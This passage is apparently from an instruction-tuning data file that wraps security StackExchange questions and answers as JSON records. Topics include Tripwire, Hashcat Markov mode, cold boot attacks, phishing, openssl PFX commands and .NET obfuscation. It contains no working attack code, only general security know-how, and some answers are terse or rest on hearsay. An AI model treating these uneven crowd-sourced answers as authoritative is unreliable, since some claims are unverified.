    "instruction": "Answer this question:\n\ntripwire report - inode number\nI am investigating Tripwire and have stumbled upon something about which I am unsure. In a tripwire report generated after I modified hosts.deny to include an extra #, I noticed the inode number changed from 6969 to 6915. I would like to know why this happened. I know inodes are records which store data about where data is stored on the file system, but would like to know why this number changed for a simple # being inserted.",
    "context": "",
    "output": "A: This is a common method of editing files in Linux. Your editor opened the file, wrote your new changes someplace (with a new inode), and when that file was completely written it linked the hosts.deny location to the new inode.\nThe reason this is done is to prevent file locking issues and to avoid partially clobbering a file. In this way, if I remove a file that's open in a program, that program doesn't end up with garbage data. In fact, as long as an inode is referenced somewhere, it remains in-tact.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "tripwire report - inode number\nI am investigating Tripwire and have stumbled upon something about which I am unsure. In a tripwire report generated after I modified hosts.deny to include an extra #, I noticed the inode number changed from 6969 to 6915. I would like to know why this happened. I know inodes are records which store data about where data is stored on the file system, but would like to know why this number changed for a simple # being inserted.",
      "answer": "This is a common method of editing files in Linux. Your editor opened the file, wrote your new changes someplace (with a new inode), and when that file was completely written it linked the hosts.deny location to the new inode.\nThe reason this is done is to prevent file locking issues and to avoid partially clobbering a file. In this way, if I remove a file that's open in a program, that program doesn't end up with garbage data. In fact, as long as an inode is referenced somewhere, it remains in-tact."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Do the Greenbone scan reports actually differ from a typical OpenVAS scan report?\nMy company is planning to use a Greenbone appliance in the near future and wants to analyze the results with another tool. I have access to OpenVAS with GSA so I am able to test the analysis now with existing scans. But I'm not sure if I can continue to use my tool for analysis as soon I will only have access to the scans from my Greenbone appliance. \nThis leads to the question: Do the Greenbone reports actually differ from a typical OpenVAS scan report?",
    "context": "",
    "output": "answer: I just got an answer to this question from a salesperson working at Greenbone. The OpenVAS-reports and the Greenbone-reports have indeed the same structure. So if you are using a parser which works on OpenVAS-reports, it will also work on the reports generated by the Greenbone appliance. The only differences are - as the salesperson put it - in quality. But this is something you should evaluate yourself, as I am in no position to justify this claim.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Do the Greenbone scan reports actually differ from a typical OpenVAS scan report?\nMy company is planning to use a Greenbone appliance in the near future and wants to analyze the results with another tool. I have access to OpenVAS with GSA so I am able to test the analysis now with existing scans. But I'm not sure if I can continue to use my tool for analysis as soon I will only have access to the scans from my Greenbone appliance. \nThis leads to the question: Do the Greenbone reports actually differ from a typical OpenVAS scan report?",
      "answer": "I just got an answer to this question from a salesperson working at Greenbone. The OpenVAS-reports and the Greenbone-reports have indeed the same structure. So if you are using a parser which works on OpenVAS-reports, it will also work on the reports generated by the Greenbone appliance. The only differences are - as the salesperson put it - in quality. But this is something you should evaluate yourself, as I am in no position to justify this claim."
    }
  },
  {
    "instruction": "Please answer this question: IDA hex-rays decompiler not loaded\nI have an executable that is  c++(x64)  compiled code upon which the decompiler is not loaded. In other files, it works fine. But they are mostly written in c. \nI am not sure if it is a limitation in version 6.8.",
    "context": "",
    "output": "The answer is that I was trying to open a 32bit file in idaq64 and so the decompiler doesn't work.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "IDA hex-rays decompiler not loaded\nI have an executable that is  c++(x64)  compiled code upon which the decompiler is not loaded. In other files, it works fine. But they are mostly written in c. \nI am not sure if it is a limitation in version 6.8.",
      "answer": "The answer is that I was trying to open a 32bit file in idaq64 and so the decompiler doesn't work."
    }
  },
  {
    "instruction": "What is the answer to this question - Hashcat brute force - markov chains\nHashcat uses Markov chains by default when using brute force mode. Do they really speed up the cracking since a randomly generated password normally has the same probability for every combination?\n\n",
    "context": "",
    "output": "The point of markov mode is not to crack randomly generated passwords - it's to crack passwords that are based on patterns.\nSo if you know that the passwords are securely randomly generated, you shouldn't use it.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Hashcat brute force - markov chains\nHashcat uses Markov chains by default when using brute force mode. Do they really speed up the cracking since a randomly generated password normally has the same probability for every combination?",
      "answer": "The point of markov mode is not to crack randomly generated passwords - it's to crack passwords that are based on patterns.\nSo if you know that the passwords are securely randomly generated, you shouldn't use it."
    }
  },
  {
    "instruction": "Can you tell me the answer to: How to keep track of passwords and avoiding password-reuse\nI have lurked for a time on security websites and similar. I came to wonder, with the number of passwords we have (or websites that need a password) how to manage this.\nSince I have well over 400 sites where a password is used, how can I keep track of all the passwords and avoid reuse?\nI have a password manager but still have passwords that are used way too many times. Is the best solution to just make 400 different passwords and let the password manager deal with the issue and look them up every time I want to login? \nOr is reusing for minor accounts the best alternative in terms of usability?",
    "context": "",
    "output": "answer: The short answer is yes, let the password manager handle it.\nYou should have your password manager generate a unique password for each site. Don't make them yourself and you won't have to worry about reuse. For sites you currently reuse on, incrementally replace them as you come across them. Many have tools to identify password reuse which can also help you.\nBased on your comments, you seem hesitant to commit to all random passwords because you use several different devices. Many password managers offer syncing solutions that work very well. Both Android and iOS support filling in login forms with password manager apps. If manual entry is a sticking point, consider generating passphrases, which are easier to remember momentarily.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to keep track of passwords and avoiding password-reuse\nI have lurked for a time on security websites and similar. I came to wonder, with the number of passwords we have (or websites that need a password) how to manage this.\nSince I have well over 400 sites where a password is used, how can I keep track of all the passwords and avoid reuse?\nI have a password manager but still have passwords that are used way too many times. Is the best solution to just make 400 different passwords and let the password manager deal with the issue and look them up every time I want to login? \nOr is reusing for minor accounts the best alternative in terms of usability?",
      "answer": "The short answer is yes, let the password manager handle it.\nYou should have your password manager generate a unique password for each site. Don't make them yourself and you won't have to worry about reuse. For sites you currently reuse on, incrementally replace them as you come across them. Many have tools to identify password reuse which can also help you.\nBased on your comments, you seem hesitant to commit to all random passwords because you use several different devices. Many password managers offer syncing solutions that work very well. Both Android and iOS support filling in login forms with password manager apps. If manual entry is a sticking point, consider generating passphrases, which are easier to remember momentarily."
    }
  },
  {
    "instruction": "What is the answer to this question - Protecting wireless network\nMy wireless network protected under WPA-PSK/WPA2-PSK protocol.\nIs there a good reason to change the default user/password for the router management interface?  \nWhat would it take for an hacker to get into my network?\nDoes the fact that I use default user/password would make it easier to hack?\n\n",
    "context": "",
    "output": "Short answer: Yes, change it.\nAs long as you can ensure that the attacker is not able to break into your WiFi (using WPA2 is good beginning) and is also not able to get access by other ways (e.g. over VPN, weak WPA2 password, plugging a cable into your switch, malware on your devices, ...), theoretically there is no need to change the password.\nHowever, since you probably can not ensure these requirements, you certainly should change the password. So that in the case the attacker is able to break into your network, he can not damage that much.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Protecting wireless network\nMy wireless network protected under WPA-PSK/WPA2-PSK protocol.\nIs there a good reason to change the default user/password for the router management interface?  \nWhat would it take for an hacker to get into my network?\nDoes the fact that I use default user/password would make it easier to hack?",
      "answer": "Short answer: Yes, change it.\nAs long as you can ensure that the attacker is not able to break into your WiFi (using WPA2 is good beginning) and is also not able to get access by other ways (e.g. over VPN, weak WPA2 password, plugging a cable into your switch, malware on your devices, ...), theoretically there is no need to change the password.\nHowever, since you probably can not ensure these requirements, you certainly should change the password. So that in the case the attacker is able to break into your network, he can not damage that much."
    }
  },
  {
    "instruction": "Question: What kind of printers do the most secure companies use?\nIf wifi-enabled printers are a bad idea, I'm wondering what kind of printers (brand even perhaps) that secure companies use, such as banks or financial institutions. I would assume these printers don't even have the capability of wifi, that is they are ethernet-only. But searching around I haven't really found anything to start on ethernet-only printers with all the standard security features of secure printers (password protection, encryption, lack of hard drives, etc.).",
    "context": "",
    "output": "Answer: Mostly they use multifunctional printers of major vendors (I worked for few and I installed printers in banks, government offices, police etc.).\nThey have turned on every possible security features like HDD encryption, SSL communication, password/chip authentication, disabled USB ports etc. Sometimes even customized firmware. As \"normal\" installation took few minutes, at those places it usually took ten's of minutes. \nThere is also special procedure of replacing old/faulty machine including formating and (multiple) rewriting data on HDD and then certified destruction of HDD.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What kind of printers do the most secure companies use?\nIf wifi-enabled printers are a bad idea, I'm wondering what kind of printers (brand even perhaps) that secure companies use, such as banks or financial institutions. I would assume these printers don't even have the capability of wifi, that is they are ethernet-only. But searching around I haven't really found anything to start on ethernet-only printers with all the standard security features of secure printers (password protection, encryption, lack of hard drives, etc.).",
      "answer": "Mostly they use multifunctional printers of major vendors (I worked for few and I installed printers in banks, government offices, police etc.).\nThey have turned on every possible security features like HDD encryption, SSL communication, password/chip authentication, disabled USB ports etc. Sometimes even customized firmware. As \"normal\" installation took few minutes, at those places it usually took ten's of minutes. \nThere is also special procedure of replacing old/faulty machine including formating and (multiple) rewriting data on HDD and then certified destruction of HDD."
    }
  },
  {
    "instruction": "Q: What hackers do in the darknet?\nWhat do hackers do in the darknet? I know that there are some \"hacker services\" that they can make some money, but I wonder if there are more interesting things, like forums about specific targets. I'm not a hacker or something, but I wonder if there is some way to know about attacks before they will happen.",
    "context": "",
    "output": " A: They do anything they want, including but not only:\n\nSharing hacking tools\nDeveloping hacking tools\nOrganizing hacking meetings/ info sharing sessions\nOrganizing large scale attacks\nOffering hacking payed services (P2HK - pay2hack)\nCreating custom hacking tools on demand (payed service)\nRecruiting new hackers",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What hackers do in the darknet?\nWhat do hackers do in the darknet? I know that there are some \"hacker services\" that they can make some money, but I wonder if there are more interesting things, like forums about specific targets. I'm not a hacker or something, but I wonder if there is some way to know about attacks before they will happen.",
      "answer": "They do anything they want, including but not only:\n\nSharing hacking tools\nDeveloping hacking tools\nOrganizing hacking meetings/ info sharing sessions\nOrganizing large scale attacks\nOffering hacking payed services (P2HK - pay2hack)\nCreating custom hacking tools on demand (payed service)\nRecruiting new hackers"
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhy is DTLS-SRTP more efficient for RTP/RTCP than just DTLS 1.2?\nWhile I understand the differences between DTLS-SRTP and pure DTLS, I cannot find much information on why exactly is DTLS-SRTP really \"optimized\" over generic DTLS 1.2.  \nRFC 5764's Introduction makes an obvious statement but without specifics anywhere in that document:\nDatagram Transport Layer Security (DTLS) [RFC4347] is a channel\nsecurity protocol that offers integrated key management, parameter\nnegotiation, and secure data transfer.  Because DTLS data transfer\nprotocol is generic, it is less highly optimized for use with RTP\nthan is SRTP, which has been specifically tuned for that purpose.\n\nI can see that in DTLS-SRTP the RTP sequence number eliminates the need to maintain another sequence number which DTLS requires. And yes, there are certain aspects like key generation for RTP, RTCP which is provided by DTLS-SRTP but in such functionality I do not see any optimization, merely convenience. \nCan someone direct me to some source to read further? I am also surprised that there is no separate tag for SRTP or even DTLS on this security-specific site. I cannot create one because of lack of points.",
    "context": "",
    "output": "The overhead of DTLS-SRTP is smaller than the overhead of RTP transported with DTLS. This is because the payload in DTLS-SRTP is actually SRTP and only the non-payload information (key exchange etc) are done with DTLS.\nTransporting RTP inside DTLS instead adds additional timestamp and sequence numbers, which are already in RTP but which are added by DTLS too. Additionally the DTLS record layer has several more fields (content type, protocol version and length) which are actually not needed in the context of RTP/SRTP. For more information compare the definition of the RTP packet when wrapped inside the DTLS record layer vs. the definition of SRTP packet which is the payload transport in plain SRTP and also DTLS-SRTP.\nIn other words: DTLS-SRTP combines the efficiency of SRTP with the flexibility regarding session setup of DTLS.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why is DTLS-SRTP more efficient for RTP/RTCP than just DTLS 1.2?\nWhile I understand the differences between DTLS-SRTP and pure DTLS, I cannot find much information on why exactly is DTLS-SRTP really \"optimized\" over generic DTLS 1.2.  \nRFC 5764's Introduction makes an obvious statement but without specifics anywhere in that document:\nDatagram Transport Layer Security (DTLS) [RFC4347] is a channel\nsecurity protocol that offers integrated key management, parameter\nnegotiation, and secure data transfer.  Because DTLS data transfer\nprotocol is generic, it is less highly optimized for use with RTP\nthan is SRTP, which has been specifically tuned for that purpose.\n\nI can see that in DTLS-SRTP the RTP sequence number eliminates the need to maintain another sequence number which DTLS requires. And yes, there are certain aspects like key generation for RTP, RTCP which is provided by DTLS-SRTP but in such functionality I do not see any optimization, merely convenience. \nCan someone direct me to some source to read further? I am also surprised that there is no separate tag for SRTP or even DTLS on this security-specific site. I cannot create one because of lack of points.",
      "answer": "The overhead of DTLS-SRTP is smaller than the overhead of RTP transported with DTLS. This is because the payload in DTLS-SRTP is actually SRTP and only the non-payload information (key exchange etc) are done with DTLS.\nTransporting RTP inside DTLS instead adds additional timestamp and sequence numbers, which are already in RTP but which are added by DTLS too. Additionally the DTLS record layer has several more fields (content type, protocol version and length) which are actually not needed in the context of RTP/SRTP. For more information compare the definition of the RTP packet when wrapped inside the DTLS record layer vs. the definition of SRTP packet which is the payload transport in plain SRTP and also DTLS-SRTP.\nIn other words: DTLS-SRTP combines the efficiency of SRTP with the flexibility regarding session setup of DTLS."
    }
  },
  {
    "instruction": "Answer the question below.\nHow is 'Removing RAM' a security risk?\nToday I was watching a video on 'Ethical Hacking' where, while discussing hardware attacks, the narrator said:\n\nRemoving RAM or components from a desktop or a laptop\n\nHere's a screenshot:\n\nI understand that removing stuff like storage drives is a security risk but removing RAM? The maximum it can do is slow down the system, but how else is that a security risk?",
    "context": "",
    "output": "If you log in somewhere (say in a browser, or some application), the password you typed in is temporarily stored in RAM for comparison against the correct password. Most applications assume the RAM is secure and don't clear everything, so it could (and often does) happen that your RAM memory contains passwords and privacy-sensitive data.\nNow RAM is said to lose data upon power loss, but it does so slowly enough and predictably enough to provide a window of time where attackers can read the contents looking. This is called a cold boot attack.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is 'Removing RAM' a security risk?\nToday I was watching a video on 'Ethical Hacking' where, while discussing hardware attacks, the narrator said:\n\nRemoving RAM or components from a desktop or a laptop\n\nHere's a screenshot:\n\nI understand that removing stuff like storage drives is a security risk but removing RAM? The maximum it can do is slow down the system, but how else is that a security risk?",
      "answer": "If you log in somewhere (say in a browser, or some application), the password you typed in is temporarily stored in RAM for comparison against the correct password. Most applications assume the RAM is secure and don't clear everything, so it could (and often does) happen that your RAM memory contains passwords and privacy-sensitive data.\nNow RAM is said to lose data upon power loss, but it does so slowly enough and predictably enough to provide a window of time where attackers can read the contents looking. This is called a cold boot attack."
    }
  },
  {
    "instruction": "Answer the following question:\n\nMac laptop security on insecure wifi connections\nI'm going every year at big IT conferences (3k->4k people). Everyone is connected to the internet with wifi on laptops. This wifi is open, everyone can read the traffic and analyse it... The risk is nearly the same on wifi in hotel, hotspot etc.. except you have a concentration of interesting informations and hacking competencies at the same place...\nI use those precautions on my mac : \n\nuse SSL everywhere\navoid to sent sensitive data even on encrypted link\nencrypt data on disk\ntake the laptop with you everywhere\nantivirus\nupdate Mac OS X to the last version\n\nIs there other security measure to take on mac ?\nThanks in advance",
    "context": "",
    "output": "What's the threat model?  With the exception of particularly hostile environments (DEF CON, for example), I just connect to a VPN and move on with things.  I believe I have my laptop hardened adequately to protect against general malware, theft, etc., by:\n\nDon't run network exposed services.\nFirewall in case I screw up #1.\nPatched.\nVPN.\nFull Disk Encryption.  (This is the theft bit.)\n\nIf you're worried about Evil Maid Attacks or other targeted attacks, you'll need to take more precautions, but if it's just general malware/bored script kiddies you're concerned with, then patch, run a VPN, and enjoy the conference.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Mac laptop security on insecure wifi connections\nI'm going every year at big IT conferences (3k->4k people). Everyone is connected to the internet with wifi on laptops. This wifi is open, everyone can read the traffic and analyse it... The risk is nearly the same on wifi in hotel, hotspot etc.. except you have a concentration of interesting informations and hacking competencies at the same place...\nI use those precautions on my mac : \n\nuse SSL everywhere\navoid to sent sensitive data even on encrypted link\nencrypt data on disk\ntake the laptop with you everywhere\nantivirus\nupdate Mac OS X to the last version\n\nIs there other security measure to take on mac ?\nThanks in advance",
      "answer": "What's the threat model?  With the exception of particularly hostile environments (DEF CON, for example), I just connect to a VPN and move on with things.  I believe I have my laptop hardened adequately to protect against general malware, theft, etc., by:\n\nDon't run network exposed services.\nFirewall in case I screw up #1.\nPatched.\nVPN.\nFull Disk Encryption.  (This is the theft bit.)\n\nIf you're worried about Evil Maid Attacks or other targeted attacks, you'll need to take more precautions, but if it's just general malware/bored script kiddies you're concerned with, then patch, run a VPN, and enjoy the conference."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is scrubbing a ssd drive effective in situations where you can't use the trim command?\nI have a luks encrypted external usb ssd drive (Samsung T3) which is unable to use the trim command. This leaves me to search for a different way to securely erase the free space inside the encrypted ssd drive.\nWith photorec I was able to succesfully recover a lot of pictures and files even though I used scrub to write random data and zeros to the ssd drive. \nThis leaves me to the question: Is scrubbing effective in deleting free space on a ssd drive? I'm not concerned with the drive degrading in any way, shape or form.",
    "context": "",
    "output": "answer: After more intensive scrubbing with the command line scrub tool (scrub -X -p schneier test which does 7 passes) I could recover only 1/10th of what I could recover before. So I guess it does have effect.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is scrubbing a ssd drive effective in situations where you can't use the trim command?\nI have a luks encrypted external usb ssd drive (Samsung T3) which is unable to use the trim command. This leaves me to search for a different way to securely erase the free space inside the encrypted ssd drive.\nWith photorec I was able to succesfully recover a lot of pictures and files even though I used scrub to write random data and zeros to the ssd drive. \nThis leaves me to the question: Is scrubbing effective in deleting free space on a ssd drive? I'm not concerned with the drive degrading in any way, shape or form.",
      "answer": "After more intensive scrubbing with the command line scrub tool (scrub -X -p schneier test which does 7 passes) I could recover only 1/10th of what I could recover before. So I guess it does have effect."
    }
  },
  {
    "instruction": "Q: Is it safe to store passwords on Google drive?\nIn the past I have seen having a Google drive document and have FTP username/passwords there.\nIs storing passwords in Google drive a good practice?",
    "context": "",
    "output": " A: Only if you trust Google with that information. This is because in all likelihood Google has access to everything in your Google drive and can extend that access to anybody given a court order to do so.\nAs for if this is good practice...no, it's not.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to store passwords on Google drive?\nIn the past I have seen having a Google drive document and have FTP username/passwords there.\nIs storing passwords in Google drive a good practice?",
      "answer": "Only if you trust Google with that information. This is because in all likelihood Google has access to everything in your Google drive and can extend that access to anybody given a court order to do so.\nAs for if this is good practice...no, it's not."
    }
  },
  {
    "instruction": "Question: Host sending massive amount of TCP/IP Packets with RA Flag: Part of DDoS Attack?\nI have a host on the Network that tries to send TCP/IP Packets to various servers. The DST Port is always 80 or 443 and the Flags set are RST and ACK. These Packets are blocked by our firewall. I did whois request for all target addresses and it where all addresses of the Google Cloud or Akamai. All 100 Request where sent within a secound. This happend several times.\nMy Suspicion now is that there are no further packets sent because the malware realized that the packets are blocked by the firewall. Is this a reasonable idea or is there a less malicious explaination for this behaviour?\n// The questionable host is running windows 7.",
    "context": "",
    "output": "Answer: I wrote a script that fetches the certificate from all hosts that where listed in the firewall with TCP:RA to port 443. The Results showed that ~70% of that hosts had certificates for *.dropbox.com and to some other cloud based solutions. Seemingly the connection of these clients had been reset by servers by sending a packet with the RST Flag set which terminated the State in the firewall. The firewall then blocked the RST,ACK Answer from the client. So no malware in most cases. One host was actually infected.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Host sending massive amount of TCP/IP Packets with RA Flag: Part of DDoS Attack?\nI have a host on the Network that tries to send TCP/IP Packets to various servers. The DST Port is always 80 or 443 and the Flags set are RST and ACK. These Packets are blocked by our firewall. I did whois request for all target addresses and it where all addresses of the Google Cloud or Akamai. All 100 Request where sent within a secound. This happend several times.\nMy Suspicion now is that there are no further packets sent because the malware realized that the packets are blocked by the firewall. Is this a reasonable idea or is there a less malicious explaination for this behaviour?\n// The questionable host is running windows 7.",
      "answer": "I wrote a script that fetches the certificate from all hosts that where listed in the firewall with TCP:RA to port 443. The Results showed that ~70% of that hosts had certificates for *.dropbox.com and to some other cloud based solutions. Seemingly the connection of these clients had been reset by servers by sending a packet with the RST Flag set which terminated the State in the firewall. The firewall then blocked the RST,ACK Answer from the client. So no malware in most cases. One host was actually infected."
    }
  },
  {
    "instruction": "Question: XSS - Suspicious email from Itunes - GF opened accidently\nMy GF received a random email from iTunes saying that she had started a new subscription, its a very convincing email until closer inspection. Anyway she clicked the link at the bottom to cancel it and it took her to a phishing website which looks like the apple id login page...(falm palm) This website was loaded via a proxy site which contained a random php script before forwarding to the final site.\nIm a sys admin so im highly security conscious. In hindsight I wish I saved the email so I could load the link in a VM to inspect the HTML code. However I think there's a possibility it could of been an XSS or CSRF attack. \nSo this email and link was pressed on an iphone 6 using the safari browser built into the phone (there was no senstive webpages open on safari at that time), i have since disabled javascript and deleted all her cookies and will reformat when I get a chance later on, iv asked her to change facebook, bank, paypal passwords etc too on a different PC.\nI dont know very much about iphone security, do you think this is still a threat after the steps I have taken if it is indeed an XSS and CSRF attack?\nIf its standard phishing, she never logged into the bogus itunes site with any credentials so im happy thats ok.",
    "context": "",
    "output": "Answer: It sounds like standard phishing page with the aim of stealing passwords and nothing more than that. XSS and CSRF attack will only work if these vulnerabilities exist in itune websites and not on any phishing page. When browser load  website it uses cookie which is stored in browser with the name of its website  and due to same origin policy it will not send any cookies or sensitive data to any other domain (phishing page) unless it is explicitly stated by website owner by implementing cors mechanism",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "XSS - Suspicious email from Itunes - GF opened accidently\nMy GF received a random email from iTunes saying that she had started a new subscription, its a very convincing email until closer inspection. Anyway she clicked the link at the bottom to cancel it and it took her to a phishing website which looks like the apple id login page...(falm palm) This website was loaded via a proxy site which contained a random php script before forwarding to the final site.\nIm a sys admin so im highly security conscious. In hindsight I wish I saved the email so I could load the link in a VM to inspect the HTML code. However I think there's a possibility it could of been an XSS or CSRF attack. \nSo this email and link was pressed on an iphone 6 using the safari browser built into the phone (there was no senstive webpages open on safari at that time), i have since disabled javascript and deleted all her cookies and will reformat when I get a chance later on, iv asked her to change facebook, bank, paypal passwords etc too on a different PC.\nI dont know very much about iphone security, do you think this is still a threat after the steps I have taken if it is indeed an XSS and CSRF attack?\nIf its standard phishing, she never logged into the bogus itunes site with any credentials so im happy thats ok.",
      "answer": "It sounds like standard phishing page with the aim of stealing passwords and nothing more than that. XSS and CSRF attack will only work if these vulnerabilities exist in itune websites and not on any phishing page. When browser load  website it uses cookie which is stored in browser with the name of its website  and due to same origin policy it will not send any cookies or sensitive data to any other domain (phishing page) unless it is explicitly stated by website owner by implementing cors mechanism"
    }
  },
  {
    "instruction": "Answer the question below.\nSpoofing POST/GET requests in a RESTful service\nI started working on an app that connects to a RESTful service for authentication and data.  User POSTs the user name and password to /token endpoint.\nOnce they log in successfully, they get a bearer token that they then append to the Authorization header in the subsequent calls to different protected resources.\nMy question is what prevents users from intercepting their regular post from the app (getting the token) and then possibly sending bunch of POST requests (using something like postman or fiddler) to create a large number of fake posts or articles or whatever else the app does.\nWhat are some possible ways from protecting from this?  Does the fact that the traffic to the service will eventually go via TLS make this a non-issue?",
    "context": "",
    "output": "My question is what prevents users from intercepting their regular post form the app\n\nNothing.\n\nDoes the fact that the traffic to the service will eventually go via TLS make this a non-issue?\n\nIf you make it for an mobile platform (Android/iOS), that makes it much harder (but not impossible).\nIf you make it for the browser, this doesn't add much protection.\n\nWhat are some possible ways from protecting from this?\n\nIt is hard to protect against automatic requests, but one thing you could do is rate limit.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Spoofing POST/GET requests in a RESTful service\nI started working on an app that connects to a RESTful service for authentication and data.  User POSTs the user name and password to /token endpoint.\nOnce they log in successfully, they get a bearer token that they then append to the Authorization header in the subsequent calls to different protected resources.\nMy question is what prevents users from intercepting their regular post from the app (getting the token) and then possibly sending bunch of POST requests (using something like postman or fiddler) to create a large number of fake posts or articles or whatever else the app does.\nWhat are some possible ways from protecting from this?  Does the fact that the traffic to the service will eventually go via TLS make this a non-issue?",
      "answer": "My question is what prevents users from intercepting their regular post form the app\n\nNothing.\n\nDoes the fact that the traffic to the service will eventually go via TLS make this a non-issue?\n\nIf you make it for an mobile platform (Android/iOS), that makes it much harder (but not impossible).\nIf you make it for the browser, this doesn't add much protection.\n\nWhat are some possible ways from protecting from this?\n\nIt is hard to protect against automatic requests, but one thing you could do is rate limit."
    }
  },
  {
    "instruction": "PFX file without import password?\nIs it possible to create a pfx file without import password? Or is it possible to remove the import password from pfx file that I've already created?",
    "context": "",
    "output": "Is it possible to create a pfx file without import password?\n\nYes, it is possible: \nopenssl req -x509 -newkey rsa:4096 -keyout PrivateKey.pem -out Cert.pem -days 365 -nodes\n\nopenssl pkcs12 -export -out keyStore.p12 -inkey PrivateKey.pem -in Cert.pem\n\n\nOr is it possible to remove the import password from pfx file that\n  I've already created?\n\nYes, it is possible:\nopenssl pkcs12 -in old.pfx -nodes | openssl pkcs12 -export -keypbe NONE -certpbe NONE -out new.p12\n\nConversion from .p12 format to .pfx format is possible by just renaming the file.\nHope that helps!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "PFX file without import password?\nIs it possible to create a pfx file without import password? Or is it possible to remove the import password from pfx file that I've already created?",
      "answer": "Is it possible to create a pfx file without import password?\n\nYes, it is possible: \nopenssl req -x509 -newkey rsa:4096 -keyout PrivateKey.pem -out Cert.pem -days 365 -nodes\n\nopenssl pkcs12 -export -out keyStore.p12 -inkey PrivateKey.pem -in Cert.pem\n\n\nOr is it possible to remove the import password from pfx file that\n  I've already created?\n\nYes, it is possible:\nopenssl pkcs12 -in old.pfx -nodes | openssl pkcs12 -export -keypbe NONE -certpbe NONE -out new.p12\n\nConversion from .p12 format to .pfx format is possible by just renaming the file.\nHope that helps!"
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhat are security issues which are specific to cloud computing?\nMoving almost everything to the Cloud gradually becomes a mainstream.\nAre there any security issues, which appeared together with this trend?\nWhat everybody should check out, from the security point of view, before moving its webapps and databases to the Amazon Cloud, Azure, etc.?",
    "context": "",
    "output": "There's an infinite amount of security issues with the cloud. To see a nasty laundry list, check out ENISA's documents.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are security issues which are specific to cloud computing?\nMoving almost everything to the Cloud gradually becomes a mainstream.\nAre there any security issues, which appeared together with this trend?\nWhat everybody should check out, from the security point of view, before moving its webapps and databases to the Amazon Cloud, Azure, etc.?",
      "answer": "There's an infinite amount of security issues with the cloud. To see a nasty laundry list, check out ENISA's documents."
    }
  },
  {
    "instruction": "Answer the following question:\n\nwhat is metaData of assemblies and what is used for\nhi there I hope you doing well\nlately, I have searched about ildasm and how to protect my DLLs from reverse engineering,\nso I found some great open source projects (ConfuseEx..), it works when I tried the reverse engineering my dll with ILSpy it didn't show my code and because of my curiosity I start searching how that happened,\nI found the reverse engineering depends on the metaData of the DLL to show Extract the code with ildasm.exe so this lead me to ask some questions I didn't find answers to them,\ndid the ConfuseEx corrupt metaData of the assemblies to protect them from reverse Engineering?\nis metaData used to define the functions of the assembly to other assemblies to use them? (without defined functions in metaData we cant access the DLL function)\ncan I protect my function content by corrupting metaData variable definitions and all these defined functions?",
    "context": "",
    "output": "Type typical use of meta data in .NET assemblies is documented here\nMetadata describes every type and member defined in your code in a language-neutral manner. Metadata stores the following information:\n\nDescription of the assembly.\nIdentity (name, version, culture, public key)\nThe types that are exported.\nOther assemblies that this assembly depends on\nSecurity permissions needed to run.\nDescription of types.\nName, visibility, base class, and interfaces implemented.\nMembers (methods, fields, properties, events, nested types).\nAttributes\nAdditional descriptive elements that modify types and members.\n\nIt is common for .NET obfuscators to modify this metadata to increase the complexity of reverse engineering.\nConfuserEx uses many different techniques for .NET obfsucation. The most basic for preventing opening with IlDasm is applying an attribute \"SuppressIldasmAttribute\" to the assembly. However nearly all modern decompilers will ignore this attribute, it doesn't add meaningful protection on its own.\nIn relation to metadata ConfuserEx also uses \"Invalid Metadata Protection\" where invalid data is added to the meta data, which can prevent older decompilers opening the assembly but modern decompilers already work around this protection.\nFull list of protections ConfuserEx uses is documented here",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "what is metaData of assemblies and what is used for\nhi there I hope you doing well\nlately, I have searched about ildasm and how to protect my DLLs from reverse engineering,\nso I found some great open source projects (ConfuseEx..), it works when I tried the reverse engineering my dll with ILSpy it didn't show my code and because of my curiosity I start searching how that happened,\nI found the reverse engineering depends on the metaData of the DLL to show Extract the code with ildasm.exe so this lead me to ask some questions I didn't find answers to them,\ndid the ConfuseEx corrupt metaData of the assemblies to protect them from reverse Engineering?\nis metaData used to define the functions of the assembly to other assemblies to use them? (without defined functions in metaData we cant access the DLL function)\ncan I protect my function content by corrupting metaData variable definitions and all these defined functions?",
